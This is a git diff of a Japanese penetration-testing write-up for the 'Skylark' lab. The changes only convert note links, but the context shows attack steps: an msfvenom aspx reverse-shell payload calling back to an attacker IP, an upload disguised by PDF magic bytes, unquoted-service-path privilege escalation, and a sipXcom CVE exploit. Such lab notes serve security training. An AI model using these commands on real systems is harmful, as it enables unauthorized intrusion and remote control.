@@ -27,7 +27,7 @@ nmap -n -Pn -sU -p69 -sV --script tftp-enum $TargetIP
 
 # VM18
 
-1. FTPが動作している、かつ、ほかのポートでUmbracoが動作していたため、[[#VM14]]で入手した認証情報でFTPログインしたところ、以下のような構成であった
+1. FTPが動作している、かつ、ほかのポートでUmbracoが動作していたため、[Summary - Skylark](Summary%20-%20Skylark.md#VM14)で入手した認証情報でFTPログインしたところ、以下のような構成であった
 ```sh
 ftp> ls
 229 Entering Extended Passive Mode (|||63862|)
@@ -39,12 +39,12 @@ drwxrwxrwx 1 ftp ftp               0 Nov 30  2022 aspnet_client
 drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
 ```
 
-2. iisstart.htm (iisのデフォルトページ) と umbracoの２つがあり、かつ、`/etc/hosts`に以下のように登録してそれぞれFQDNとTLD+1でアクセスしたところ、umbracoとIISに振り分けられたので、バーチャルホストと推定（[[👻Gobuster#補足：バーチャルホストとは]]）
+2. iisstart.htm (iisのデフォルトページ) と umbracoの２つがあり、かつ、`/etc/hosts`に以下のように登録してそれぞれFQDNとTLD+1でアクセスしたところ、umbracoとIISに振り分けられたので、バーチャルホストと推定（[👻Gobuster](../Tools/👻Gobuster.md#補足：バーチャルホストとは)）
 ```sh
 192.168.1.20 tokyo07.skylark.com skylark.com
 ```
 
-3. umbracoは`/bin/Debug/net6.0/publish`があり、Net 6+の比較的新しい環境で動作しており、一方でIISは直でweb rootであったため、ASP.net framework（古い）と推定し、aspx ペイロードをアップ（[[WebShell#ASP / ASP.NET (IIS)]]）
+3. umbracoは`/bin/Debug/net6.0/publish`があり、Net 6+の比較的新しい環境で動作しており、一方でIISは直でweb rootであったため、ASP.net framework（古い）と推定し、aspx ペイロードをアップ（[WebShell](../Cheatsheet/Common/WebShell.md#ASP%20/%20ASP.NET%20(IIS))）
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=443 -f aspx -o reverse.aspx
 ```
@@ -66,7 +66,7 @@ drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
 http://skylark.jp:24680/reverse.aspx
 ```
 
-5. 内部でサービスを列挙したところ、クオテーションに囲まれていないサービスを発見したので、エクスプロイトして権限昇格（[[💥Windows Privilege Escalation#Unquoted Service Pathのエクスプロイト方法]]）
+5. 内部でサービスを列挙したところ、クオテーションに囲まれていないサービスを発見したので、エクスプロイトして権限昇格（[💥Windows Privilege Escalation](../Cheatsheet/🪟Windows/💥Windows%20Privilege%20Escalation.md#Unquoted%20Service%20Pathのエクスプロイト方法)）
 ```powershell
 Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
   Where-Object {
@@ -89,9 +89,9 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
 
 1. VM16でsquidが動作していた、かつ、VM16のWebサービスで172.16のインターフェースを持つことを示唆する出力があったため、FoxyProxyとproxychainsに登録のうえ、内部NW側のインターフェースにアクセスしたところ、sipXcomを発見
 
-2. [[#VM14]]のTFTPDで発見したsipXcomの認証情報を使いログイン
+2. [Summary - Skylark](Summary%20-%20Skylark.md#VM14)のTFTPDで発見したsipXcomの認証情報を使いログイン
 
-3. [[脆弱性リスト#SipXcom RCE・PE（CVE-2023-25355・CVE-2023-25356）]]を使い、権限昇格
+3. [脆弱性リスト](../Misc/脆弱性リスト.md#SipXcom%20RCE・PE（CVE-2023-25355・CVE-2023-25356）)を使い、権限昇格
 
 ---
 
@@ -108,7 +108,7 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
 1. nginxのみしか動作していないように見えて、FeroxBusterでスキャンしたらUploadディレクトリを発見
 	- **反省**：FeroxBusterで403を見逃すと、表面上はアクセスできなくても、深いパスであればアクセスできることを見逃す
 
-2. PDFファイルしか受け付けないホワイトリスト型の防御であったため、[[⚡️File upload vuln#Magic Number フィルタ]]でPDFファイルとしてPHPファイルを詐称のうえ、アップロード
+2. PDFファイルしか受け付けないホワイトリスト型の防御であったため、[⚡️File upload vuln](../../BSCP/Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md#Magic%20Number%20フィルタ)でPDFファイルとしてPHPファイルを詐称のうえ、アップロード
 
 3. FeroxBusterでUploadsディレクトリが403になっていたため、`Uploads/<payload>`にアクセスしてリバースシェルをトリガーし、www-data として初期アクセス
 
@@ -141,8 +141,8 @@ root
 
 # VM13
 
-1. [[#VM17]]で入手した認証情報でWebサービスに接続し、`.rdp`ファイルをゲット
-- ちなみに、nginxでGobusterしても何も出力はされなかったが、[[#VM17]]のPDFファイルに/RDWebというディレクトリがあることがわかった
+1. [Summary - Skylark](Summary%20-%20Skylark.md#VM17)で入手した認証情報でWebサービスに接続し、`.rdp`ファイルをゲット
+- ちなみに、nginxでGobusterしても何も出力はされなかったが、[Summary - Skylark](Summary%20-%20Skylark.md#VM17)のPDFファイルに/RDWebというディレクトリがあることがわかった
 ```sh
 PORT   STATE SERVICE REASON  VERSION
 80/tcp    open  http          Microsoft IIS httpd 10.0
